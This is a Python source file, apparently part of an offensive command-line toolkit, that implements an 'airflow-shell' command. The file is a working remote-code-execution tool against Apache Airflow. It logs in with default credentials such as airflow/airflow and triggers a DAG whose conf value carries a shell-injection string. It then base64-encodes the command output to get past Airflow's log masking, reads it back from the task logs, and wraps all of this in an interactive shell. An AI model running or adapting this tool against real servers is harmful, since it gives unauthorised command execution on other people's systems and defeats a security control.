import requests
import time
import base64
import urllib3
import click
from rich import print
from rich.console import Console

urllib3.disable_warnings()

console = Console()


def airflow_rce_execute(base_url, auth, cmd, dag='dag_log_cleanup', task='log_cleanup_worker_num_1_dir_0', timeout=45):
    headers = {'Content-Type': 'application/json'}
    wrapped = f'1"; ({cmd}) 2>&1 | base64 -w0; echo "'
    r = requests.post(f'{base_url}/api/v1/dags/{dag}/dagRuns', auth=auth, verify=False, timeout=15,
        headers=headers, json={'conf': {'maxLogAgeInDays': wrapped}})
    if r.status_code != 200:
        return f'Error triggering DAG: {r.status_code} {r.text[:200]}'
    run_id = r.json()['dag_run_id']

    for _ in range(timeout):
        time.sleep(1)
        tasks_r = requests.get(f'{base_url}/api/v1/dags/{dag}/dagRuns/{run_id}/taskInstances',
            auth=auth, verify=False, timeout=15)
        if tasks_r.status_code != 200:
            continue
        for t in tasks_r.json().get('task_instances', []):
            if t['task_id'] == task and t['state'] in ('success', 'failed', 'up_for_retry'):
                logs = requests.get(f'{base_url}/api/v1/dags/{dag}/dagRuns/{run_id}/taskInstances/{task}/logs/1',
                    auth=auth, verify=False, timeout=15, headers={'Accept': 'text/plain'})
                for line in logs.text.split('\n'):
                    if 'INFO -' in line:
                        content = line.split('INFO - ', 1)[-1].strip()
                        if len(content) > 20:
                            valid = all(c in 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=\n' for c in content)
                            if valid:
                                try:
                                    return base64.b64decode(content).decode('utf-8', errors='replace')
                                except Exception:
                                    pass
                return '[no base64 output captured]'
    return '[timeout waiting for task completion]'


@click.command("airflow-shell")
@click.option("--host", required=True, help="Airflow host (e.g., https://10.0.0.1)")
@click.option("--user", "-u", default="airflow", help="Username")
@click.option("--password", "-p", default="airflow", help="Password")
@click.option("--dag", default="dag_log_cleanup", help="DAG ID with BashOperator")
@click.option("--task", default="log_cleanup_worker_num_1_dir_0", help="Task ID of BashOperator")
@click.option("--cmd", "-c", default=None, help="Single command to execute (non-interactive)")
@click.option("--timeout", default=45, help="Max wait time for task completion")
def airflow_shell_cmd(host, user, password, dag, task, cmd, timeout):
    """Interactive RCE shell via Airflow DAG injection.

    \b
    Injects commands through BashOperator's conf template injection.
    Output is base64-encoded to bypass Airflow's log masking.

    \b
    Examples:
      hot airflow shell --host https://10.0.0.1 -c "id"
      hot airflow shell --host https://10.0.0.1 -u admin -p admin
      hot airflow shell --host https://10.0.0.1 --dag my_dag --task my_task
    """
    base_url = host.rstrip('/')
    auth = (user, password)

    if cmd:
        result = airflow_rce_execute(base_url, auth, cmd, dag, task, timeout)
        if result:
            print(result)
        return

    print("[bold red]Airflow RCE Shell[/bold red]")
    print(f"[cyan]Target:[/cyan] {base_url}")
    print(f"[cyan]Auth:[/cyan] {user}:{'*' * len(password)}")
    print(f"[cyan]DAG:[/cyan] {dag} / {task}")
    print("[dim]Type 'exit' to quit. Commands execute via DAG trigger (~10-20s delay).[/dim]\n")

    with console.status("[bold green]Verifying access...") as status:
        test = airflow_rce_execute(base_url, auth, "id", dag, task, timeout)
        if test and 'uid=' in test:
            print(f"[green]Connected![/green] {test.strip()}")
        else:
            print(f"[red]Connection failed or no RCE:[/red] {test}")
            return

    while True:
        try:
            user_cmd = input(f"\n[airflow@{host.split('//')[1].split('/')[0]}]$ ").strip()
            if not user_cmd:
                continue
            if user_cmd == 'exit':
                break
            with console.status(f"[bold yellow]Executing: {user_cmd[:50]}..."):
                result = airflow_rce_execute(base_url, auth, user_cmd, dag, task, timeout)
            if result:
                print(result)
        except (KeyboardInterrupt, EOFError):
            print("\n[yellow]Exiting...[/yellow]")
            break
